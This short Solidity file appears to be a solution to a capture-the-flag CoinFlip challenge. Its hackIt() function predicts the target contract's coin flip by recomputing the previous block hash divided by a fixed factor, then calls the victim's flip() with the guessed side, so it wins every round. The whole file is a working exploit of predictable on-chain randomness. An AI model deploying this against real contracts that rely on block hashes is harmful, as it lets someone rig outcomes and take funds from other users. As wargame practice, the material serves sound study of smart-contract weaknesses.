pragma solidity ^0.5.1;

import "./CoinFlip.sol";

contract CoinFlipSol {
    CoinFlip private _victim;
    uint256 private lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _address) public {
        _victim = CoinFlip(_address);
    }

    function hackIt() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _victim.flip(side);

    }
}
